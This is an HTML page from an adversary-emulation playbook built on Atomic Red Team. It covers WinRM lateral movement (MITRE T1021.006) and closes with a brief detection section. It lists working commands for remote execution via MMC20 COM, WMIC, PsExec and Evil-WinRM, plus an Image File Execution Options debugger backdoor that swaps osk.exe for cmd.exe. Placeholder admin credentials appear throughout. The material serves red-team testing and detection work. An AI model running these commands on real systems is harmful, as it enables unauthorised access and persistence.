

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta charset="utf-8" />
    <title>T1021.006 - Remote Services: Windows Remote Management &#8212; The Atomic Playbook</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
    <link href="../../_static/css/index.css" rel="stylesheet">
    <link rel="stylesheet" href="../../_static/sphinx-book-theme.css" type="text/css" />
    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
    <link rel="stylesheet" type="text/css" href="../../_static/jupyter-sphinx.css" />
    <script id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
    <script src="../../_static/sphinx-book-theme.js"></script>
    <script src="../../_static/jquery.js"></script>
    <script src="../../_static/underscore.js"></script>
    <script src="../../_static/doctools.js"></script>
    <script src="../../_static/language_data.js"></script>
    <script src="../../_static/togglebutton.js"></script>
    <script src="../../_static/clipboard.min.js"></script>
    <script src="../../_static/copybutton.js"></script>
    <script src="../../_static/mystnb.js"></script>
    <script src="../../_static/sphinx-book-theme.js"></script>
    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.4/require.min.js"></script>
    <script src="https://unpkg.com/@jupyter-widgets/html-manager@^0.18.0/dist/embed-amd.js"></script>
    <script async="async" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
    <script >
        const thebe_selector = ".thebe"
        const thebe_selector_input = "pre"
        const thebe_selector_output = ".output"
    </script>
    <script async="async" src="../../_static/sphinx-thebe.js"></script>
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="T1175 - Component Object Model and Distributed COM" href="T1175.html" />
    <link rel="prev" title="T1021.002 - Remote Services: SMB/Windows Admin Shares" href="T1021.002.html" />

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="docsearch:language" content="en">



  </head>
  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
    

    <div class="container-xl">
      <div class="row">
          
<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
    
        <div class="navbar-brand-box">
<a class="navbar-brand text-wrap" href="../../index.html">
  
  <img src="../../_static/logo.png" class="logo" alt="logo">
  
  
  <h1 class="site-logo" id="site-title">The Atomic Playbook</h1>
  
</a>
</div>

<form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
  <i class="icon fas fa-search"></i>
  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
</form>

<nav class="bd-links" id="bd-docs-nav" aria-label="Main navigation">
  <ul class="nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="../../intro.html">
   Welcome to the Atomic Playbook
  </a>
 </li>
</ul>
<ul class="current nav sidenav_l1">
 <li class="toctree-l1">
  <a class="reference internal" href="../initial-access.html">
   Initial Access
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../execution.html">
   Execution
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../persistence.html">
   Persistence
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../privilege-escalation.html">
   Privilege Escalation
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../defense-evasion.html">
   Defense Evasion
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../credential-access.html">
   Credential Access
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../discovery.html">
   Discovery
  </a>
 </li>
 <li class="toctree-l1 current active">
  <a class="reference internal" href="../lateral-movement.html">
   Lateral Movement
  </a>
  <ul class="current">
   <li class="toctree-l2">
    <a class="reference internal" href="T1550.003.html">
     T1550.003 - Use Alternate Authentication Material: Pass the Ticket
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1210.html">
     T1210 - Exploitation of Remote Services
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1021.003.html">
     T1021.003 - Distributed Component Object Model
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1021.001.html">
     T1021.001 - Remote Services: Remote Desktop Protocol
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1550.001.html">
     T1550.001 - Application Access Token
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1563.html">
     T1563 - Remote Service Session Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1072.html">
     T1072 - Software Deployment Tools
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1021.005.html">
     T1021.005 - VNC
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1563.001.html">
     T1563.001 - SSH Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1091.html">
     T1091 - Replication Through Removable Media
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1550.002.html">
     T1550.002 - Use Alternate Authentication Material: Pass the Hash
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1051.html">
     T1051 - Shared Webroot
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1021.002.html">
     T1021.002 - Remote Services: SMB/Windows Admin Shares
    </a>
   </li>
   <li class="toctree-l2 current active">
    <a class="current reference internal" href="#">
     T1021.006 - Remote Services: Windows Remote Management
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1175.html">
     T1175 - Component Object Model and Distributed COM
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1563.002.html">
     T1563.002 - Remote Service Session Hijacking: RDP Hijacking
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1550.004.html">
     T1550.004 - Web Session Cookie
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1021.004.html">
     T1021.004 - SSH
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1021.html">
     T1021 - Remote Services
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1534.html">
     T1534 - Internal Spearphishing
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1080.html">
     T1080 - Taint Shared Content
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1570.html">
     T1570 - Lateral Tool Transfer
    </a>
   </li>
   <li class="toctree-l2">
    <a class="reference internal" href="T1550.html">
     T1550 - Use Alternate Authentication Material
    </a>
   </li>
  </ul>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../collection.html">
   Collection
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../command-and-control.html">
   Command and Control
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../exfiltration.html">
   Exfiltration
  </a>
 </li>
 <li class="toctree-l1">
  <a class="reference internal" href="../impact.html">
   Impact
  </a>
 </li>
</ul>

</nav>

 <!-- To handle the deprecated key -->

<div class="navbar_extra_footer">
  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
</div>

</div>


          


          
<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
    
    <div class="row topbar fixed-top container-xl">
    <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show">
    </div>
    <div class="col pl-2 topbar-main">
        
        <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
            data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
            aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
            title="Toggle navigation" data-toggle="tooltip" data-placement="left">
            <i class="fas fa-bars"></i>
            <i class="fas fa-arrow-left"></i>
            <i class="fas fa-arrow-up"></i>
        </button>
        
        <div class="dropdown-buttons-trigger">
    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
            class="fas fa-download"></i></button>

    
    <div class="dropdown-buttons">
        <!-- ipynb file if we had a myst markdown file -->
        
        <!-- Download raw file -->
        <a class="dropdown-buttons" href="../../_sources/tactics/lateral-movement/T1021.006.ipynb"><button type="button"
                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                data-placement="left">.ipynb</button></a>
        <!-- Download PDF via print -->
        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
    </div>
    
</div>
        <!-- Source interaction buttons -->


        <!-- Full screen (wrap in <a> to have style consistency -->
        <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
                data-placement="bottom" onclick="toggleFullScreen()" title="Fullscreen mode"><i
                    class="fas fa-expand"></i></button></a>

        <!-- Launch buttons -->

    </div>

    <!-- Table of contents -->
    <div class="d-none d-md-block col-md-2 bd-toc show">
        <div class="tocsection onthispage pt-5 pb-3">
            <i class="fas fa-list"></i> Contents
        </div>
        <nav id="bd-toc-nav">
            <ul class="nav section-nav flex-column">
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#atomic-tests">
   Atomic Tests
  </a>
  <ul class="nav section-nav flex-column">
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-1-enable-windows-remote-management">
     Atomic Test #1 - Enable Windows Remote Management
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         powershell
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-2-powershell-lateral-movement">
     Atomic Test #2 - PowerShell Lateral Movement
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id1">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         powershell
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-3-wmic-process-call-create">
     Atomic Test #3 - WMIC Process Call Create
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         command_prompt
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-4-psexec">
     Atomic Test #4 - Psexec
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#dependencies-run-with-none">
       Dependencies:  Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         None
        </span>
       </code>
       !
      </a>
      <ul class="nav section-nav flex-column">
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#description-psexec-tool-from-sysinternals-must-exist-on-disk-at-specified-location-psexec-exe">
         Description: PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#check-prereq-commands">
         Check Prereq Commands:
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#get-prereq-commands">
         Get Prereq Commands:
        </a>
       </li>
      </ul>
     </li>
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id2">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         command_prompt
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-5-invoke-command">
     Atomic Test #5 - Invoke-Command
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id3">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         powershell
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#atomic-test-6-winrm-access-with-evil-winrm">
     Atomic Test #6 - WinRM Access with Evil-WinRM
    </a>
    <ul class="nav section-nav flex-column">
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
       Dependencies:  Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         powershell
        </span>
       </code>
       !
      </a>
      <ul class="nav section-nav flex-column">
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#description-computer-must-have-ruby-installed">
         Description: Computer must have Ruby Installed
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id4">
         Check Prereq Commands:
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id5">
         Get Prereq Commands:
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#description-computer-must-have-evil-winrm-installed">
         Description: Computer must have Evil-WinRM installed
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id6">
         Check Prereq Commands:
        </a>
       </li>
       <li class="toc-h5 nav-item toc-entry">
        <a class="reference internal nav-link" href="#id7">
         Get Prereq Commands:
        </a>
       </li>
      </ul>
     </li>
     <li class="toc-h4 nav-item toc-entry">
      <a class="reference internal nav-link" href="#id8">
       Attack Commands: Run with
       <code class="docutils literal notranslate">
        <span class="pre">
         powershell
        </span>
       </code>
      </a>
     </li>
    </ul>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#detection">
   Detection
  </a>
 </li>
</ul>

        </nav>
    </div>
</div>
    <div id="main-content" class="row">
        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
        
              <div>
                
  <div class="section" id="t1021-006-remote-services-windows-remote-management">
<h1>T1021.006 - Remote Services: Windows Remote Management<a class="headerlink" href="#t1021-006-remote-services-windows-remote-management" title="Permalink to this headline">¶</a></h1>
<p>Adversaries may use <a class="reference external" href="https://attack.mitre.org/techniques/T1078">Valid Accounts</a> to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.</p>
<p>WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the <code class="docutils literal notranslate"><span class="pre">winrm</span></code> command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014)</p>
<div class="section" id="atomic-tests">
<h2>Atomic Tests<a class="headerlink" href="#atomic-tests" title="Permalink to this headline">¶</a></h2>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="c1">#Import the Module before running the tests.</span>
<span class="c1"># Checkout Jupyter Notebook at https://github.com/haresudhan/TheAtomicPlaybook to run PS scripts.</span>
<span class="n">Import</span><span class="o">-</span><span class="n">Module</span> <span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="mh">0x6c</span><span class="o">/</span><span class="n">AtomicRedTeam</span><span class="o">/</span><span class="n">atomics</span><span class="o">/</span><span class="n">invoke</span><span class="o">-</span><span class="n">atomicredteam</span><span class="o">/</span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicRedTeam</span><span class="o">.</span><span class="n">psd1</span> <span class="o">-</span> <span class="n">Force</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="atomic-test-1-enable-windows-remote-management">
<h3>Atomic Test #1 - Enable Windows Remote Management<a class="headerlink" href="#atomic-test-1-enable-windows-remote-management" title="Permalink to this headline">¶</a></h3>
<p>Powershell Enable WinRM</p>
<p>Upon successful execution, powershell will “Enable-PSRemoting” allowing for remote PS access.</p>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)</p>
<div class="section" id="attack-commands-run-with-powershell">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Enable-PSRemoting</span> <span class="n">-Force</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1021</span><span class="o">.</span><span class="mi">006</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">1</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-2-powershell-lateral-movement">
<h3>Atomic Test #2 - PowerShell Lateral Movement<a class="headerlink" href="#atomic-test-2-powershell-lateral-movement" title="Permalink to this headline">¶</a></h3>
<p>Powershell lateral movement using the mmc20 application com object.</p>
<p>Reference:</p>
<p>https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/</p>
<p>Upon successful execution, cmd will spawn calc.exe on a remote computer.</p>
<p><strong>Supported Platforms:</strong> windows</p>
<div class="section" id="id1">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[activator]</span><span class="p">::</span><span class="n">CreateInstance</span><span class="p">(</span><span class="no">[type]</span><span class="p">::</span><span class="n">GetTypeFromProgID</span><span class="p">(</span><span class="s2">&quot;MMC20.application&quot;</span><span class="p">,</span><span class="s2">&quot;computer1&quot;</span><span class="p">)).</span><span class="n">Document</span><span class="p">.</span><span class="n">ActiveView</span><span class="p">.</span><span class="n">ExecuteShellCommand</span><span class="p">(</span><span class="s2">&quot;c:\windows\system32\calc.exe&quot;</span><span class="p">,</span> <span class="nv">$null</span><span class="p">,</span> <span class="nv">$null</span><span class="p">,</span> <span class="s2">&quot;7&quot;</span><span class="p">)</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1021</span><span class="o">.</span><span class="mi">006</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">2</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-3-wmic-process-call-create">
<h3>Atomic Test #3 - WMIC Process Call Create<a class="headerlink" href="#atomic-test-3-wmic-process-call-create" title="Permalink to this headline">¶</a></h3>
<p>Utilize WMIC to start remote process.</p>
<p>Upon successful execution, cmd will utilize wmic.exe to modify the registry on a remote endpoint to swap osk.exe with cmd.exe.</p>
<p><strong>Supported Platforms:</strong> windows</p>
<div class="section" id="attack-commands-run-with-command-prompt">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>wmic /user:DOMAIN\Administrator /password:P@ssw0rd1 /node:Target process call create &quot;C:\Windows\system32\reg.exe add \&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\&quot; /v \&quot;Debugger\&quot; /t REG_SZ /d \&quot;cmd.exe\&quot; /f&quot;
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1021</span><span class="o">.</span><span class="mi">006</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-4-psexec">
<h3>Atomic Test #4 - Psexec<a class="headerlink" href="#atomic-test-4-psexec" title="Permalink to this headline">¶</a></h3>
<p>Utilize psexec to start remote process.</p>
<p>Upon successful execution, cmd will utilize psexec.exe to spawn cmd.exe on a remote system.</p>
<p><strong>Supported Platforms:</strong> windows</p>
<div class="section" id="dependencies-run-with-none">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">None</span></code>!<a class="headerlink" href="#dependencies-run-with-none" title="Permalink to this headline">¶</a></h4>
<div class="section" id="description-psexec-tool-from-sysinternals-must-exist-on-disk-at-specified-location-psexec-exe">
<h5>Description: PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})<a class="headerlink" href="#description-psexec-tool-from-sysinternals-must-exist-on-disk-at-specified-location-psexec-exe" title="Permalink to this headline">¶</a></h5>
</div>
<div class="section" id="check-prereq-commands">
<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>if (Test-Path &quot;C:\PSTools\PsExec.exe&quot;) { exit 0} else { exit 1}

</pre></div>
</div>
</div>
<div class="section" id="get-prereq-commands">
<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>Invoke-WebRequest &quot;https://download.sysinternals.com/files/PSTools.zip&quot; -OutFile &quot;$env:TEMP\PsTools.zip&quot;
Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
New-Item -ItemType Directory (&quot;C:\PSTools\PsExec.exe&quot;) -Force | Out-Null
Copy-Item $env:TEMP\PsTools\PsExec.exe &quot;C:\PSTools\PsExec.exe&quot; -Force

</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1021</span><span class="o">.</span><span class="mi">006</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">4</span> <span class="o">-</span><span class="n">GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="id2">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>C:\PSTools\PsExec.exe \\localhost -accepteula -u DOMAIN\Administrator -p P@ssw0rd1 -s cmd.exe
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1021</span><span class="o">.</span><span class="mi">006</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">4</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-5-invoke-command">
<h3>Atomic Test #5 - Invoke-Command<a class="headerlink" href="#atomic-test-5-invoke-command" title="Permalink to this headline">¶</a></h3>
<p>Execute Invoke-command on remote host.</p>
<p>Upon successful execution, powershell will execute ipconfig on localhost using <code class="docutils literal notranslate"><span class="pre">invoke-command</span></code>.</p>
<p><strong>Supported Platforms:</strong> windows</p>
<div class="section" id="id3">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">invoke-command</span> <span class="n">-ComputerName</span> <span class="n">localhost</span> <span class="n">-scriptblock</span> <span class="p">{</span><span class="n">ipconfig</span><span class="p">}</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1021</span><span class="o">.</span><span class="mi">006</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">5</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-6-winrm-access-with-evil-winrm">
<h3>Atomic Test #6 - WinRM Access with Evil-WinRM<a class="headerlink" href="#atomic-test-6-winrm-access-with-evil-winrm" title="Permalink to this headline">¶</a></h3>
<p>An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled
<strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)</p>
<div class="section" id="dependencies-run-with-powershell">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
<div class="section" id="description-computer-must-have-ruby-installed">
<h5>Description: Computer must have Ruby Installed<a class="headerlink" href="#description-computer-must-have-ruby-installed" title="Permalink to this headline">¶</a></h5>
</div>
<div class="section" id="id4">
<h5>Check Prereq Commands:<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h5>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">ruby</span> <span class="n">-v</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="id5">
<h5>Get Prereq Commands:<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h5>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>Invoke-WebRequest  -OutFile $env:Temp\rubyinstaller-2.7.1-1-x64.exe https://github.com/oneclick/rubyinstaller2/releases/download/RubyInstaller-2.7.1-1/rubyinstaller-2.7.1-1-x64.exe
$file1= $env:Temp + &quot;\rubyinstaller-2.7.1-1-x64.exe&quot;
Start-Process $file1 /S;
</pre></div>
</div>
</div>
<div class="section" id="description-computer-must-have-evil-winrm-installed">
<h5>Description: Computer must have Evil-WinRM installed<a class="headerlink" href="#description-computer-must-have-evil-winrm-installed" title="Permalink to this headline">¶</a></h5>
</div>
<div class="section" id="id6">
<h5>Check Prereq Commands:<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h5>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">evil-winrm</span> <span class="n">-h</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
</pre></div>
</div>
</div>
<div class="section" id="id7">
<h5>Get Prereq Commands:<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h5>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">gem</span> <span class="n">install</span> <span class="n">evil-winrm</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1021</span><span class="o">.</span><span class="mi">006</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">6</span> <span class="o">-</span><span class="n">GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="id8">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">evil-winrm</span> <span class="n">-i</span> <span class="n">Target</span> <span class="n">-u</span> <span class="n">Domain</span><span class="p">\</span><span class="n">Administrator</span> <span class="n">-p</span> <span class="n">P</span><span class="nv">@ssw0rd1</span><span class="p">```</span>
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1021</span><span class="o">.</span><span class="mi">006</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">6</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="detection">
<h2>Detection<a class="headerlink" href="#detection" title="Permalink to this headline">¶</a></h2>
<p>Monitor use of WinRM within an environment by tracking service execution. If it is not normally used or is disabled, then this may be an indicator of suspicious behavior. Monitor processes created and actions taken by the WinRM process or a WinRM invoked script to correlate it with other related events.(Citation: Medium Detecting Lateral Movement)</p>
</div>
</div>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "binder-examples/jupyter-stacks-datascience",
            ref: "master",
        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: ".net-powershell"
        },
        kernelOptions: {
